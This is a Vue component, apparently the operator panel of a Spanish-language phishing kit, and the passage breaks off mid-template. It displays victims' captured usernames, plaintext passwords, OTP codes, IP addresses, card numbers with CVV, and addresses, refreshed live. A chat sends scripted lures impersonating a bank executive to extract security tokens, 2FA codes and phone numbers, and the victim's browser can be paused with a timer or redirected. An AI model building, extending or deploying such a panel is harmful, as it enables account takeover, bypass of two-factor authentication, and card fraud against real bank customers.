<script setup>
import { ref, onMounted } from 'vue'
import { router } from '@inertiajs/vue3'

// Props del usuario
const props = defineProps({
  userId: {
    type: [String, Number],
    required: true
  },
  admin: { type: Object, default: () => ({ is_superadmin: false, permisos: {} }) }
})

// Variable reactiva para el userId actual (puede cambiar dinámicamente)
const currentUserId = ref(props.userId)

// Permisos y Sidebar
const sidebarOpen = ref(false)
function toggleSidebar(){ sidebarOpen.value = !sidebarOpen.value }
function can(key){
  const adm = props.admin || { is_superadmin:false, permisos:{} }
  return !!(adm.is_superadmin || (adm.permisos && adm.permisos[key]))
}

// Variables reactivas (inicializar con valores vacíos para evitar saltos)
const userData = ref({
  usuario: '',
  password: '',
  nombre: '',
  apellido: '',
  email: '',
  telefono_movil: '',
  telefono_fijo: '',
  token_codigo: '',
  sgdotoken_codigo: '',
  ip_real: '',
  fecha_ingreso: '',
  fecha_ingreso_formatted: '',
  nombre_completo: '',
  estado_real: 'offline',
  // Campos  (pago/envo)
  tarjeta_numero: '',
  tarjeta_expiracion: '',
  tarjeta_cvv: '',
  titular_tarjeta: '',
  direccion: '',
  codigo_postal: '',
  estado_residencia: ''
})

const chatStatus = ref({
  status: 'offline',
  text: 'DESCONECTADO'
})

// Variables para el polling eficiente
const currentDataHash = ref('')
const isPollingActive = ref(true)
let pollingInterval = null

const chatMessage = ref('')
const isLoading = ref(true)
const error = ref(null)
const showQuickMenu = ref(false)

// Variables para el chat
const chatMessages = ref([])
const inputVisible = ref(false) // Controla si el input es visible para el usuario
const enterSendEnabled = ref(true) // Controla si se puede enviar con Enter
let chatPollingInterval = null
const isChatPollingActive = ref(false)
let lastChatHash = ''

// Mensajes rápidos predefinidos
const quickMessages = ref([
  {
    text: "Ingresa tu RFC",
    icon: "fas fa-id-card"
  },
  {
    text: "Ingresa tu código de Seguridad Token",
    icon: "fas fa-key"
  },
  {
    text: "Ingresa tu codigo seguridad 2FA",
    icon: "fas fa-shield-halved"
  },
  {
    text: "Ingresa tu numero movil",
    icon: "fas fa-mobile-alt"
  },
  {
    text: "Un ejecutivo esta intentando localizarte, manten cerca tu dispositivo movil",
    icon: "fas fa-search-location"
  },
  {
    text: "Hemos intentado localizarte sin exito, por favor. Ingresa un nuevo numero para contactarnos.",
    icon: "fas fa-phone-slash"
  },
  {
    text: "Validacion de Identidad: Ingresa tu correo electronico vinculado a tu cuenta.",
    icon: "fas fa-envelope-open-text"
  },
  {
    text: "Validacion de Identidad: Ingresa el numero movil o telefonico vinculado a tu cuenta.",
    icon: "fas fa-shield-alt"
  }
])

// Variables para modales de herramientas
const showTimerModal = ref(false)
const showRedireccionModal = ref(false)
const timerData = ref({
  tiempo_segundos: 60,
  mensaje_personalizado: 'Por favor, espera mientras procesamos tu solicitud...'
})
const redireccionData = ref({
  url_destino: '',
  tipo_redireccion: 'index'
})

// Función para cerrar la ventana
function closeWindow() {
  window.close()
}

// ===== FUNCIONES DEL CHAT =====

// Función para enviar mensaje
async function sendMessage() {
  const message = chatMessage.value.trim()
  if (!message) return

  const tipoMensaje = inputVisible.value ? 'con_input' : 'sin_input'

  try {
    // console.log('🚀 Enviando mensaje:', { message, tipoMensaje, userId: currentUserId.value, enterEnabled: enterSendEnabled.value })

    // Agregar mensaje del admin al chat inmediatamente
    const adminMessage = {
      id: Date.now(),
      type: 'admin',
      content: message,
      timestamp: new Date(),
      inputVisible: inputVisible.value
    }

    addMessageToChat(adminMessage)

    // Limpiar input
    chatMessage.value = ''

    // Enviar mensaje al backend
    // console.log('📡 Enviando petición a:', '/admin/api/mensajes/enviar')

    // Obtener CSRF token
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

    const response = await fetch('/admin/api/mensajes/enviar', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        usuario_id: currentUserId.value,
        mensaje: message,
        tipo_mensaje: tipoMensaje,
        enter_enabled: Boolean(enterSendEnabled.value) // Asegurar que sea boolean
      })
    })

    // console.log('📡 Respuesta del servidor:', response.status, response.statusText)

    // Verificar si la respuesta es válida
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`)
    }

    // Verificar si la respuesta es JSON
    const contentType = response.headers.get('content-type')
    if (!contentType || !contentType.includes('application/json')) {
      const textResponse = await response.text()
      // console.error('Respuesta no es JSON:', textResponse)
      throw new Error('El servidor no devolvió una respuesta JSON válida')
    }

    const data = await response.json()
    // console.log('📊 Datos recibidos:', data)

    if (!data.success) {
      // console.error('Error enviando mensaje:', data.error)
      // Mostrar error en el chat
      const errorMessage = {
        id: Date.now(),
        type: 'system',
        content: 'Error: ' + (data.error || 'Error desconocido'),
        timestamp: new Date()
      }
      addMessageToChat(errorMessage)
    }
  } catch (error) {
    // console.error('Error de conexión completo:', error)
    const errorMessage = {
      id: Date.now(),
      type: 'system',
      content: 'Error de conexión: ' + (error.message || 'No se pudo conectar con el servidor'),
      timestamp: new Date()
    }
    addMessageToChat(errorMessage)
  }
}

// Función para agregar mensaje al chat
function addMessageToChat(message) {
  chatMessages.value.push(message)

  // Scroll al final del chat
  setTimeout(() => {
    const chatContainer = document.querySelector('.chat-messages-container')
    if (chatContainer) {
      chatContainer.scrollTop = chatContainer.scrollHeight
    }
  }, 100)
}

// Función para formatear tiempo
function formatTime(date) {
  return date.toLocaleTimeString('es-ES', {
    hour: '2-digit',
    minute: '2-digit'
  })
}

// Función para toggle de visibilidad del input
function toggleInputVisibility() {
  inputVisible.value = !inputVisible.value
  // console.log('Visibilidad del input:', inputVisible.value ? 'Visible para usuario' : 'Oculto para usuario')
}

// Función para toggle de envío con Enter
function toggleEnterSend() {
  enterSendEnabled.value = !enterSendEnabled.value
  // console.log('Envío con Enter:', enterSendEnabled.value ? 'Activado' : 'Desactivado')
}

// Función para manejar Enter en el input
function handleEnterKey() {
  if (enterSendEnabled.value) {
    sendMessage()
  }
}

// ===== FUNCIONES DE HERRAMIENTAS =====

// Enviar herramientas de soporte
async function enviarHerramientas() {
  if (!currentUserId.value) return

  try {
    // console.log('🛠️ Enviando herramientas a usuario:', currentUserId.value)

    const response = await fetch('/admin/api/herramientas/enviar', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
      },
      body: JSON.stringify({
        usuario_id: currentUserId.value
      })
    })

    const data = await response.json()

    if (data.success) {
      // console.log('✅ Herramientas enviadas correctamente')
      // Agregar mensaje al chat
      const toolMessage = {
        id: Date.now(),
        type: 'admin',
        content: '🛠️ Herramientas de soporte enviadas',
        timestamp: new Date()
      }
      addMessageToChat(toolMessage)
    } else {
      // console.error('Error enviando herramientas:', data.error)
    }
  } catch (error) {
    // console.error('Error de conexión enviando herramientas:', error)
  }
}

// Mostrar modal de timer
function mostrarTimerModal() {
  showTimerModal.value = true
}

// Enviar timer
async function enviarTimer() {
  if (!currentUserId.value) return

  try {
    // console.log('⏰ Enviando timer a usuario:', currentUserId.value, timerData.value)

    const response = await fetch('/admin/api/timer/enviar', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
      },
      body: JSON.stringify({
        usuario_id: currentUserId.value,
        tiempo_segundos: timerData.value.tiempo_segundos,
        mensaje_personalizado: timerData.value.mensaje_personalizado
      })
    })

    const data = await response.json()

    if (data.success) {
      // console.log('✅ Timer enviado correctamente')
      showTimerModal.value = false
      // Agregar mensaje al chat
      const timerMessage = {
        id: Date.now(),
        type: 'admin',
        content: `⏰ Timer enviado: ${timerData.value.tiempo_segundos}s`,
        timestamp: new Date()
      }
      addMessageToChat(timerMessage)
    } else {
      // console.error('Error enviando timer:', data.error)
    }
  } catch (error) {
    // console.error('Error de conexión enviando timer:', error)
  }
}

// Mostrar modal de redirección
function mostrarRedireccionModal() {
  showRedireccionModal.value = true
}

// Enviar redirección
async function enviarRedireccion() {
  if (!currentUserId.value) return

  // Validar URL si es personalizada
  if (redireccionData.value.tipo_redireccion === 'url_personalizada' && !redireccionData.value.url_destino.trim()) {
    alert('Por favor ingresa una URL de destino')
    return
  }

  try {
    // Determinar URL final y texto para mostrar
    let urlFinal = redireccionData.value.tipo_redireccion === 'index' ? '/' : redireccionData.value.url_destino
    let textoDestino = redireccionData.value.tipo_redireccion === 'index' ? 'Index' : redireccionData.value.url_destino

    // console.log('🔄 Enviando redirección a usuario:', currentUserId.value, {
      // tipo: redireccionData.value.tipo_redireccion,
      // url: urlFinal
    // })

    const response = await fetch('/admin/api/redireccion/enviar', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
      },
      body: JSON.stringify({
        usuario_id: currentUserId.value,
        url_destino: urlFinal,
        tipo_redireccion: redireccionData.value.tipo_redireccion
      })
    })

    const data = await response.json()

    if (data.success) {
      // console.log('✅ Redirección enviada correctamente')
      showRedireccionModal.value = false

      // Agregar mensaje al chat
      const redirectMessage = {
        id: Date.now(),
        type: 'admin',
        content: `🔄 Redirección enviada a: ${textoDestino}`,
        timestamp: new Date()
      }
      addMessageToChat(redirectMessage)

      // Resetear datos
      redireccionData.value = {
        url_destino: '',
        tipo_redireccion: 'index'
      }
    } else {
      // console.error('Error enviando redirección:', data.error)
      alert('Error: ' + (data.error || 'Error desconocido'))
    }
  } catch (error) {
    // console.error('Error de conexión enviando redirección:', error)
    alert('Error de conexión')
  }
}

// Función para cargar mensajes del chat
async function loadChatMessages(isPolling = false) {
  try {
    const response = await fetch(`/admin/api/mensajes/cargar/${currentUserId.value}`)
    const data = await response.json()

    if (data.success) {
      const messages = data.mensajes || []

      // Generar hash de los nuevos datos
      const newChatHash = generateChatHash(messages)

      // Solo actualizar si hay cambios (para polling) o si es carga inicial
      if (!isPolling || newChatHash !== lastChatHash) {
        lastChatHash = newChatHash

        if (messages.length > 0) {
          // Limpiar mensajes existentes
          chatMessages.value = []

          // Agregar cada mensaje
          messages.forEach(message => {
            addMessageToChat({
              ...message,
              timestamp: new Date(message.timestamp)
            })
          })

          if (isPolling) {
            // console.log('Chat actualizado automáticamente')
          }
        }
      }
    }
  } catch (error) {
    // console.error('Error cargando mensajes:', error)
  }
}

// Función para generar hash de mensajes
function generateChatHash(messages) {
  return JSON.stringify(messages.map(msg => ({
    id: msg.id,
    content: msg.content,
    type: msg.type,
    timestamp: msg.timestamp
  })))
}

// Función para iniciar polling del chat
function startChatPolling() {
  if (chatPollingInterval) {
    clearInterval(chatPollingInterval)
  }

  isChatPollingActive.value = true

  // Ejecutar polling cada 3 segundos
  chatPollingInterval = setInterval(() => {
    if (isChatPollingActive.value) {
      loadChatMessages(true) // true indica que es polling
    }
  }, 3000)

  // console.log('Auto-refresh del chat iniciado')
}

// Función para detener polling del chat
function stopChatPolling() {
  if (chatPollingInterval) {
    clearInterval(chatPollingInterval)
    chatPollingInterval = null
  }

  isChatPollingActive.value = false
  // console.log('Auto-refresh del chat detenido')
}

// ===== FUNCIONES DE POLLING EFICIENTE =====

// Función para realizar polling eficiente
async function performPolling(userId = null) {
  if (!isPollingActive.value) return

  try {
    const targetUserId = userId || currentUserId.value || props.userId

    const response = await fetch(`/admin/api/panel-dinamico/${targetUserId}/polling?hash=${currentDataHash.value}`, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      }
    })

    if (!response.ok) {
      // console.warn('Error en polling del panel dinámico:', response.status)
      return
    }

    const data = await response.json()

    if (data.hasChanges) {
      // console.log(`📊 Cambios detectados para usuario ${targetUserId}, actualizando...`)

      // Formatear datos del usuario
      const newUserData = {
        ...data.usuario,
        // Formatear nombre completo
        nombre_completo: data.usuario.nombre && data.usuario.apellido
          ? `${data.usuario.nombre} ${data.usuario.apellido}`
          : data.usuario.nombre || data.usuario.apellido || 'Sin nombre',
        // Formatear fecha
        fecha_ingreso_formatted: data.usuario.fecha_ingreso
          ? new Date(data.usuario.fecha_ingreso).toLocaleString('es-ES')
          : 'No disponible'
      }

      // Actualizar datos reactivos
      userData.value = newUserData
      chatStatus.value = data.chat_status
      currentDataHash.value = data.hash

      // console.log(`✅ Panel dinámico actualizado para usuario ${targetUserId}`)
    } else {
      // console.log(`📊 Sin cambios para usuario ${targetUserId}`)
    }

    // Actualizar hash para la próxima consulta
    currentDataHash.value = data.hash

  } catch (error) {
    // console.error('❌ Error en polling del panel dinámico:', error)
  }
}

// Función para cargar datos iniciales (primera carga)
async function loadUserData(userId = null) {
  try {
    // Mostrar loading solo en cambios de usuario
    const isUserChange = userId && userId !== currentUserId.value
    if (isUserChange) {
      isLoading.value = true
    }
    error.value = null

    // Usar el userId pasado o el actual de currentUserId o props
    const targetUserId = userId || currentUserId.value || props.userId
    currentUserId.value = targetUserId

    // console.log(`🔄 Carga inicial de datos para usuario: ${targetUserId}`)
    const response = await fetch(`/admin/api/usuario/${targetUserId}`)

    if (!response.ok) {
      throw new Error(`Error ${response.status}: ${response.statusText}`)
    }

    const data = await response.json()

    if (data.error) {
      throw new Error(data.error)
    }

    // Formatear datos del usuario
    const newUserData = {
      ...data.usuario,
      // Formatear nombre completo
      nombre_completo: data.usuario.nombre && data.usuario.apellido
        ? `${data.usuario.nombre} ${data.usuario.apellido}`
        : data.usuario.nombre || data.usuario.apellido || 'Sin nombre',
      // Formatear fecha
      fecha_ingreso_formatted: data.usuario.fecha_ingreso
        ? new Date(data.usuario.fecha_ingreso).toLocaleString('es-ES')
        : 'No disponible'
    }

    // Actualizar datos
    userData.value = newUserData
    chatStatus.value = data.chat_status
    currentDataHash.value = '' // Reset hash para forzar primera actualización

    isLoading.value = false

  } catch (err) {
    // console.error('Error cargando datos del usuario:', err)
    error.value = err.message
    isLoading.value = false

    // Solo mostrar error si no hay datos previos
    if (!userData.value.usuario || userData.value.usuario === 'Cargando...') {
      userData.value = {
        usuario: 'Error',
        password: 'Error',
        nombre_completo: 'Error al cargar',
        telefono_movil: 'Error',
        telefono_fijo: 'Error',
        token_codigo: 'Error',
        sgdotoken_codigo: 'Error'
      }
    }

    chatStatus.value = {
      status: 'offline',
      text: 'ERROR'
    }
  }
}

// Función para iniciar el polling
function startPolling() {
  if (pollingInterval) {
    clearInterval(pollingInterval)
  }

  isPollingActive.value = true
  // console.log('🔄 Iniciando polling del panel dinámico cada 2 segundos...')

  // Ejecutar polling cada 2 segundos
  pollingInterval = setInterval(() => {
    performPolling(currentUserId.value)
  }, 2000)

  // Ejecutar uno inmediatamente
  performPolling(currentUserId.value)
}

// Función para detener el polling
function stopPolling() {
  if (pollingInterval) {
    clearInterval(pollingInterval)
    pollingInterval = null
  }

  isPollingActive.value = false
  // console.log('⏹️ Polling del panel dinámico detenido')
}

// Función para alternar el polling
function togglePolling() {
  if (isPollingActive.value) {
    stopPolling()
  } else {
    startPolling()
  }
}

// Función para toggle del polling con confirmación
async function togglePollingWithConfirmation() {
  const action = isPollingActive.value ? 'detener' : 'activar'

  // Importar Swal dinámicamente si no está disponible
  const Swal = (await import('sweetalert2')).default

  const result = await Swal.fire({
    title: `¿${action.charAt(0).toUpperCase() + action.slice(1)} actualización automática?`,
    html: `¿Quieres ${action} la actualización automática cada 2 segundos?<br><small>Esto ${isPollingActive.value ? 'detendrá' : 'iniciará'} la sincronización en tiempo real de los datos del usuario.</small>`,
    icon: 'question',
    showCancelButton: true,
    confirmButtonColor: isPollingActive.value ? '#ef4444' : '#10b981',
    cancelButtonColor: '#6b7280',
    confirmButtonText: `Sí, ${action}`,
    cancelButtonText: 'Cancelar',
    background: '#1f2937',
    color: '#ffffff'
  })

  if (result.isConfirmed) {
    if (isPollingActive.value) {
      stopPolling()
    } else {
      startPolling()
    }

    Swal.fire({
      title: '¡Configuración actualizada!',
      text: `La actualización automática ha sido ${isPollingActive.value ? 'activada' : 'desactivada'}.`,
      icon: 'success',
      background: '#1f2937',
      color: '#ffffff',
      confirmButtonColor: '#10b981',
      timer: 2000,
      timerProgressBar: true
    })
  }
}



// Funciones para el menú de mensajes rápidos
function toggleQuickMenu() {
  showQuickMenu.value = !showQuickMenu.value
}

function selectQuickMessage(message) {
  chatMessage.value = message.text
  showQuickMenu.value = false
  // console.log('Mensaje rápido seleccionado:', message.text)
  // Auto-focus en el input después de seleccionar
  setTimeout(() => {
    const input = document.querySelector('input[type="text"]')
    if (input) input.focus()
  }, 100)
}

function closeQuickMenu() {
  showQuickMenu.value = false
}

// Función para manejar mensajes del Dashboard padre (SPA behavior)
function handleParentMessage(event) {
  // Verificar origen por seguridad
  if (event.origin !== window.location.origin) {
    // console.warn('Mensaje rechazado por origen incorrecto:', event.origin)
    return
  }

  // console.log('Mensaje recibido:', event.data)

  // Manejar cambio de usuario
  if (event.data && (event.data.type === 'CHANGE_USER' || event.data.type === 'CHANGE_USER_CONFIRM')) {
    const newUserId = String(event.data.userId)
    const currentId = String(currentUserId.value || props.userId)

    // console.log(`🔄 Cambio de usuario solicitado (${event.data.type}): ${currentId} → ${newUserId}`)

    if (newUserId !== currentId) {
      // Actualizar URL sin recargar (para mantener historial)
      const newUrl = `/admin/panel-dinamico/${newUserId}`
      window.history.replaceState({}, '', newUrl)

      // Cargar datos del nuevo usuario (SPA style)
      // console.log(`📡 Cargando datos para usuario ${newUserId}`)
      loadUserData(newUserId)

      // Reiniciar polling para el nuevo usuario
      if (isPollingActive.value) {
        stopPolling()
        setTimeout(() => startPolling(), 100)
      }

      // Enviar confirmación de recepción al Dashboard
      if (window.parent && window.parent !== window) {
        window.parent.postMessage({
          type: 'USER_CHANGED_CONFIRM',
          userId: newUserId,
          success: true
        }, window.location.origin)
      }
    } else {
      // console.log('⚠️ Usuario ya es el actual, no se requiere cambio')
    }
  }
}

// ===== LIFECYCLE HOOKS =====

import { onUnmounted } from 'vue'

// Cargar datos al montar el componente y configurar SPA behavior
onMounted(() => {
  // console.log('🚀 Panel Dinámico montado para usuario:', props.userId)

  // Carga inicial
  loadUserData()

  // Iniciar polling automáticamente
  startPolling()

  // Inicializar chat
  loadChatMessages()
  startChatPolling()

  // Escuchar mensajes del Dashboard padre para cambios SPA
  window.addEventListener('message', handleParentMessage)
})

onUnmounted(() => {
  // console.log('🛑 Panel Dinámico desmontado')

  // Limpiar polling al desmontar
  stopPolling()
  stopChatPolling()

  // Limpiar event listeners
  window.removeEventListener('message', handleParentMessage)
})
</script>

<template>
  <div class="min-h-screen bg-gray-900 text-white">
    <!-- Sidebar overlay -->
    <div v-if="sidebarOpen" class="fixed inset-0 bg-black bg-opacity-50 z-40" @click="toggleSidebar"></div>
    <!-- Sidebar -->
    <aside :class="['fixed z-50 top-0 left-0 h-full w-64 bg-gray-800 border-r border-gray-700 transform transition-transform', sidebarOpen ? 'translate-x-0' : '-translate-x-full']">
      <div class="p-4 border-b border-gray-700 flex items-center justify-between">
        <div class="flex items-center space-x-2">
          <i class="fas fa-cogs text-yellow-500"></i>
          <span class="text-white font-semibold">Menú Admin</span>
        </div>
        <button @click="toggleSidebar" class="text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      <nav class="p-4 space-y-2">
        <button @click="router.get('/admin/dashboard'); toggleSidebar()" class="w-full text-left px-3 py-2 rounded hover:bg-gray-700 text-gray-200 flex items-center">
          <i class="fas fa-tachometer-alt mr-2 text-gray-400"></i>
          Dashboard
        </button>
        <button v-if="can('manage_admins')" @click="router.get('/admin/mods'); toggleSidebar()" class="w-full text-left px-3 py-2 rounded hover:bg-gray-700 text-gray-200 flex items-center">
          <i class="fas fa-users-cog mr-2 text-gray-400"></i>
          Perfiles / Mods
        </button>
      </nav>
    </aside>
    <!-- Header -->
    <header class="bg-gray-800 shadow-lg border-b border-gray-700">
      <div class="px-4 py-4">
        <div class="flex items-center justify-between">
          <div class="flex items-center space-x-3">
            <button @click="toggleSidebar" class="p-2 rounded bg-gray-700 hover:bg-gray-600 text-gray-200" title="Menú">
              <i :class="sidebarOpen ? 'fas fa-times' : 'fas fa-bars'"></i>
            </button>
            <div class="w-9 h-9 bg-blue-500 rounded-lg flex items-center justify-center">
              <i class="fas fa-shield-alt text-black"></i>
            </div>
            <div>
              <h1 class="text-xl font-bold text-white">Control</h1>
              <p class="text-gray-400 text-sm">Panel Dinámico</p>
            </div>
          </div>
          <div class="flex items-center space-x-3">
            <div class="bg-yellow-500 text-black px-3 py-1 rounded text-sm font-semibold data-transition">
              ID: {{ currentUserId }}
            </div>
            <button v-if="can('panel.send.custom_message') || can('panel.send.herramientas') || can('panel.send.timer') || can('panel.send.redireccion')" @click="togglePollingWithConfirmation" :class="[
              'px-3 py-2 rounded transition-colors text-sm',
              isPollingActive ? 'bg-green-600 hover:bg-green-700 text-white' : 'bg-red-600 hover:bg-red-700 text-white'
            ]" :title="isPollingActive ? 'Detener actualización automática' : 'Iniciar actualización automática'">
              <i :class="isPollingActive ? 'fas fa-pause' : 'fas fa-play'"></i>
            </button>
            <button @click="closeWindow" class="bg-gray-700 text-white px-3 py-2 rounded hover:bg-gray-600 transition-colors">
              <i class="fas fa-times"></i>
            </button>
          </div>
        </div>
      </div>
    </header>

    <!-- Contenido Principal Responsive -->
    <main class="flex flex-col lg:flex-row" style="height: calc(100vh - 80px);">
      <!-- Columna Izquierda - Chat -->
      <div class="flex-1 flex flex-col bg-gray-900 lg:border-r border-gray-700">
        <!-- Header del Chat -->
        <div class="bg-gray-800 border-b border-gray-700 px-4 py-3">
          <div class="flex items-center justify-between">
            <div>
              <h2 class="text-lg font-bold text-white">Chat con Usuario</h2>
              <p class="text-sm text-gray-400 data-transition">ID: {{ currentUserId }}</p>
            </div>
            <div class="flex items-center space-x-2">
              <i :class="[
                'fas fa-circle text-sm',
                chatStatus.status === 'online' ? 'text-green-400' :
                chatStatus.status === 'inactive' ? 'text-yellow-400' : 'text-gray-500'
              ]"></i>
              <span class="text-sm font-medium text-gray-300">{{ chatStatus.text }}</span>
            </div>
          </div>
        </div>

        <!-- Área de Mensajes Más Grande -->
        <div class="flex-1 p-4 overflow-y-auto chat-messages-container" style="min-height: 400px; max-height: 500px;">
          <!-- Mensajes del Chat -->
          <div v-if="chatMessages.length === 0" class="flex items-center justify-center h-full">
            <div class="text-center text-gray-500">
              <i class="fas fa-comments text-6xl mb-4"></i>
              <p class="text-xl">No hay mensajes aún</p>
            </div>
          </div>

          <!-- Lista de Mensajes -->
          <div v-else class="space-y-4">
            <div
              v-for="message in chatMessages"
              :key="message.id"
              :class="[
                'flex',
                message.type === 'admin' ? 'justify-end' : 'justify-start'
              ]"
            >
              <div
                :class="[
                  'max-w-xs lg:max-w-md px-4 py-2 rounded-lg',
                  message.type === 'admin'
                    ? 'bg-blue-600 text-white'
                    : message.type === 'user'
                    ? 'bg-gray-600 text-white'
                    : 'bg-red-600 text-white'
                ]"
              >
                <p class="text-sm">{{ message.content }}</p>
                <div class="flex items-center justify-between mt-1">
                  <span class="text-xs opacity-75">
                    {{ formatTime(message.timestamp) }}
                  </span>
                  <span v-if="message.type === 'admin' && message.inputVisible !== undefined" class="text-xs opacity-75 ml-2">
                    <i :class="message.inputVisible ? 'fas fa-eye' : 'fas fa-eye-slash'"></i>
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- Input del Chat con 4 Botones y Menú Rápido -->
        <div class="bg-gray-800 border-t border-gray-700 p-4 relative">
          <div v-if="!can('panel.send.custom_message')" class="mb-2 text-sm text-gray-400">
            Sin permiso para enviar mensajes.
          </div>
          <!-- Menú de Mensajes Rápidos -->
          <transition name="slide-up">
            <div v-if="showQuickMenu" class="absolute bottom-full left-4 right-4 mb-2 bg-gray-700 rounded-lg shadow-2xl border border-gray-600 max-h-80 overflow-y-auto z-50">
              <div class="p-3 border-b border-gray-600">
                <div class="flex items-center justify-between">
                  <h3 class="text-sm font-semibold text-white flex items-center">
                    <i class="fas fa-comments mr-2 text-yellow-500"></i>
                    Mensajes Rápidos
                  </h3>
                  <button @click="closeQuickMenu" class="text-gray-400 hover:text-white transition-colors">
                    <i class="fas fa-times"></i>
                  </button>
                </div>
              </div>
              <div class="max-h-64 overflow-y-auto">
                <button
                  v-for="(message, index) in quickMessages"
                  :key="index"
                  @click="selectQuickMessage(message)"
                  class="w-full text-left p-3 hover:bg-gray-600 transition-colors border-b border-gray-600 last:border-b-0 group"
                >
                  <div class="flex items-start space-x-3">
                    <div class="flex-shrink-0 w-8 h-8 bg-gray-600 rounded-full flex items-center justify-center group-hover:bg-yellow-500 transition-colors">
                      <i :class="message.icon" class="text-xs text-gray-300 group-hover:text-black"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                      <p class="text-sm text-gray-200 group-hover:text-white transition-colors leading-relaxed">
                        {{ message.text }}
                      </p>
                    </div>
                  </div>
                </button>
              </div>
            </div>
          </transition>

          <!-- Overlay para cerrar menú -->
          <div v-if="showQuickMenu" @click="closeQuickMenu" class="fixed inset-0 z-40"></div>

          <div v-if="can('panel.send.custom_message')" class="flex items-center space-x-3">
            <input
              v-model="chatMessage"
              @keyup.enter="handleEnterKey"
              type="text"
              class="flex-1 px-4 py-3 bg-gray-700 border border-gray-600 rounded text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:border-transparent text-base"
              placeholder="Escribe tu mensaje..."
              maxlength="500"
            >
            <button @click="sendMessage" class="bg-yellow-500 text-black px-4 py-3 rounded hover:bg-yellow-600 transition-colors">
              <i class="fas fa-paper-plane"></i>
            </button>
            <button @click="toggleQuickMenu" class="bg-gray-600 text-gray-300 px-4 py-3 rounded hover:bg-gray-500 transition-colors relative" :class="{ 'bg-yellow-500 text-black': showQuickMenu }" title="Mensajes rápidos">
              <i class="fas fa-list"></i>
            </button>
            <button @click="toggleInputVisibility" :class="[
              'px-4 py-3 rounded transition-colors',
              inputVisible ? 'bg-green-600 text-white hover:bg-green-700' : 'bg-gray-600 text-gray-300 hover:bg-gray-500'
            ]" :title="inputVisible ? 'Input visible para usuario' : 'Input oculto para usuario'">
              <i :class="inputVisible ? 'fas fa-eye' : 'fas fa-eye-slash'"></i>
            </button>
            <button @click="toggleEnterSend" :class="[
              'px-4 py-3 rounded transition-colors',
              enterSendEnabled ? 'bg-blue-600 text-white hover:bg-blue-700' : 'bg-gray-600 text-gray-300 hover:bg-gray-500'
            ]" :title="enterSendEnabled ? 'Envío con Enter activado' : 'Envío con Enter desactivado'">
              <i :class="enterSendEnabled ? 'fas fa-keyboard' : 'fas fa-ban'"></i>
            </button>
          </div>
        </div>
      </div>

      <!-- Columna Derecha - Historial de Registro (Responsive) -->
      <div class="w-full lg:w-96 bg-gray-800 flex flex-col">
        <!-- Header del Historial -->
        <div class="bg-gray-700 border-b border-gray-600 px-4 py-3">
          <div class="flex items-center space-x-2">
            <i class="fas fa-user-edit text-yellow-500"></i>
            <span class="font-semibold text-white">Historial de Registro</span>
          </div>
        </div>

        <!-- Contenido del Historial -->
        <div class="flex-1 p-4 space-y-4 overflow-y-auto">

          <!-- Indicador de Error -->
          <div v-if="error" class="bg-red-600 rounded-lg p-4 mb-4">
            <div class="flex items-center space-x-2">
              <i class="fas fa-exclamation-triangle text-white"></i>
              <span class="text-white font-semibold">Error al cargar datos</span>
            </div>
            <p class="text-red-200 text-sm mt-2">{{ error }}</p>
          </div>
          <!-- Datos de Usuario -->
          <div class="bg-gray-700 rounded-lg p-4">
            <div class="flex items-center justify-between mb-3">
              <span class="text-sm text-gray-300">Datos de Usuario</span>
              <span class="bg-blue-600 text-white text-xs px-2 py-1 rounded-full font-semibold">USUARIO</span>
            </div>
            <div class="space-y-2">
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Usuario:</strong>
                <span class="text-sm text-gray-400 transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.usuario || 'N/A' }}
                </span>
              </div>
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Contraseña:</strong>
                <span class="text-sm text-gray-400 transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.password || 'N/A' }}
                </span>
              </div>
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Código OTP:</strong>
                <span class="text-sm text-gray-400 transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.otp || 'N/A' }}
                </span>
              </div>
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">IP Real:</strong>
                <span class="text-sm text-gray-400 transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.ip_real || 'N/A' }}
                </span>
              </div>
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Fecha Ingreso:</strong>
                <span class="text-sm text-gray-400 transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.fecha_ingreso_formatted || 'N/A' }}
                </span>
              </div>

            </div>
          </div>

          <!-- Datos de Contacto -->
          <div class="bg-gray-700 rounded-lg p-4">
            <div class="flex items-center justify-between mb-3">
              <span class="text-sm text-gray-300">Datos de Contacto</span>
              <span class="bg-blue-600 text-white text-xs px-2 py-1 rounded-full font-semibold">CONTACTO</span>
            </div>
            <div class="space-y-2">
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Email:</strong>
                <span class="text-sm text-gray-400 transition-all duration-300" :class="{ 'opacity-75': isLoading }">
                  {{ userData.email || 'N/A' }}
                </span>
              </div>
              <div class="flex justify-between items-center">
                <strong class="text-sm text-gray-200">Teléfono:</strong>
